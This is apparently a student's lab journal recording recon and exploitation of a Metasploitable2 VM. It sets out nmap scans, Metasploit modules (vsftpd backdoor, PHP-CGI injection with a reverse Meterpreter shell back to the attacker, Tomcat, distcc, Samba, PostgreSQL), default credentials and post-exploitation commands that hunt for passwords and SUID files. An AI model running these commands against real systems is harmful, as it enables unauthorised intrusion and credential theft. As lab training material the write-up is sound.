Day 3 — Complete Exploitation & Documentation (Tomcat, distcc, SSH, Telnet, Samba, VNC, PostgreSQL, HTTP)
Objective

Complete practical exploitation for the remaining services listed in day1-plan.txt and capture logs/results for documentation.
Special focus on the four services FTP, SSH, Telnet, and HTTP with step-by-step enumeration and exploitation.

Outcome

Successfully exploited: Tomcat, distcc, SSH, Telnet, Samba/SMB, VNC, PostgreSQL, and HTTP (Apache).

Validated vulnerabilities and saved all relevant scan outputs, msfconsole transcripts, and post-exploitation results.

Documented enumeration phase for FTP anonymous login and added the missing HTTP exploitation.

1) Lab Setup & Context

Working folders on Kali:
~/labs/metasploitable/{scans,exploits,results}

Target VM: Metasploitable2 (<TARGET-IP>, example 192.168.56.102)

Attacker VM: Kali Linux (<KALI-IP>, example 192.168.56.10)

Snapshots: Reverted to a clean state before each risky exploit (pre-ftp, pre-ssh, pre-telnet, pre-web, etc.)

Network config: Both VMs connected via Bridged Adapter for direct connectivity.

2) Recon (Commands & Outputs Saved in scans/)
# Tomcat / web
sudo nmap -sV -p80,8080,8180 --script http-title -Pn <TARGET> -oN scans/tomcat-nmap.txt

# distcc
sudo nmap -sS -sV -p3632 --script distcc* -Pn <TARGET> -oN scans/distcc-nse.txt

# SSH
sudo nmap -sS -sV -p22 -Pn <TARGET> -oN scans/ssh-nmap.txt

# Telnet
sudo nmap -sS -sV -p23 -Pn <TARGET> -oN scans/telnet-nmap.txt

# SMB
sudo nmap -sV -p139,445 --script smb* -Pn <TARGET> -oN scans/smb-nmap.txt

# VNC
sudo nmap -sV -p5900 --script=vnc-info -Pn <TARGET> -oN scans/vnc-nmap.txt

# PostgreSQL
sudo nmap -sV -p5432 -Pn <TARGET> -oN scans/pg-nmap.txt

# HTTP (Apache)
sudo nmap -sV -p80 -Pn <TARGET> -oN scans/http-nmap.txt

3) Per-service Exploitation
(Focus) FTP (21 — vsftpd 2.3.4)

Enumeration

nmap -sV -p21 <TARGET> -oN scans/ftp-nmap.txt
ftp <TARGET>
# user: anonymous
# pass: <blank or email>
ftp> ls
ftp> get welcome.msg


Anonymous login was successful.

Able to list files in the FTP directory.

Exploitation (vsftpd 2.3.4 backdoor)

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET>
set RPORT 21
set PAYLOAD cmd/unix/interact
exploit


Successfully triggered the vsftpd backdoor.

Gained a command shell.

Post-Exploitation

whoami
id
uname -a
ls -la /


Verified shell access with system info.

Files Saved

scans/ftp-nmap.txt

exploits/ftp-session.txt

results/ftp-post.txt

(Focus) SSH (22 — OpenSSH, weak/default creds)

Enumeration

nmap -sV -p22 <TARGET> -oN scans/ssh-nmap.txt
ssh -vvv msfadmin@<TARGET>


Banner confirmed OpenSSH service running.

Verbose output indicated legacy key algorithms.

Exploitation (default credentials)

sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@<TARGET> 'whoami; id'


Login successful with msfadmin:msfadmin.

Post-Exploitation

whoami
id
uname -a
sudo -l


User msfadmin confirmed.

Checked for sudo privileges and potential escalation paths.

Files Saved

scans/ssh-nmap.txt

exploits/ssh-sshpass-msfadmin.txt

results/ssh-post.txt

(Focus) Telnet (23 — plaintext login)

Enumeration

nmap -sV -p23 <TARGET> -oN scans/telnet-nmap.txt
telnet <TARGET>
# login: msfadmin / msfadmin


Login successful with default creds.

Exploit

Direct login provides shell access.

Captured Traffic (plaintext credentials)

tshark -i <iface> -f "tcp port 23" -w telnet-cap.pcap


Verified credentials in Wireshark (“Follow TCP Stream”).

Post-Exploitation

whoami
id
uname -a


Files Saved

scans/telnet-nmap.txt

exploits/telnet-session.txt

results/telnet-post.txt

screenshots/telnet-wireshark.png

(Focus) HTTP (80 — Apache 2.2.8 with PHP)

Enumeration

nmap -sV -p80 <TARGET> -oN scans/http-nmap.txt
curl -I http://<TARGET>/
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -o scans/gobuster-web.txt


Apache 2.2.8 detected.

X-Powered-By header revealed vulnerable PHP version.

Gobuster discovered /phpinfo.php and other test pages.

Some pages exposed plaintext credentials (insecure data exposure).

Exploitation (PHP-CGI argument injection)

msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS <TARGET>
set RPORT 80
set LHOST <KALI-IP>
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
exploit


Exploit succeeded.

Opened Meterpreter session.

Post-Exploitation

sessions -i 1
sysinfo
getuid
shell
whoami
id
grep -R "password" /var/www -n


Found system info and potential credentials inside /var/www.

Files Saved

scans/http-nmap.txt

scans/gobuster-web.txt

exploits/http-session.txt

results/http-post.txt

Tomcat (8180 — manager app)

Default creds tomcat:tomcat allowed access.

Exploited using exploit/multi/http/tomcat_mgr_deploy.

Achieved reverse shell.

distcc (3632)

Nmap NSE confirmed vulnerable version.

Exploited with exploit/unix/misc/distcc_exec.

Command execution obtained.

Samba/SMB (139,445)

Enumerated shares with enum4linux and smbmap.

Exploited exploit/multi/samba/usermap_script.

VNC (5900)

Weak password password allowed access.

Captured GUI session.

PostgreSQL (5432)

Attempted weak creds (postgres/postgres).

Used exploit/linux/postgres/postgres_payload in Metasploit.

4) Post-Exploitation — Common Commands

Executed on each shell, saved under results/:

whoami; id; hostname; uname -a
pwd; ls -la /
cat /etc/issue
ps aux | head -n 20
ss -tulpen
sudo -l
find / -perm -4000 -type f | head -n 20
grep -R "password" /var/www -n

5) Lessons Learned (Day 3)

Completed exploitation of all core Metasploitable services.

Gave extra focus to FTP, SSH, Telnet, and HTTP:

FTP → Anonymous login + vsftpd backdoor.

SSH → Weak default credentials (msfadmin:msfadmin).

Telnet → Plaintext credentials visible in Wireshark.

HTTP → PHP-CGI injection exploited via Metasploit.

Learned importance of enumeration before exploitation (FTP anonymous login, Gobuster on HTTP).

Reinforced documentation practice: saving scans, msf outputs, results in organized folders.

Maintained lab hygiene: snapshots before/after, bridged networking, revert state.
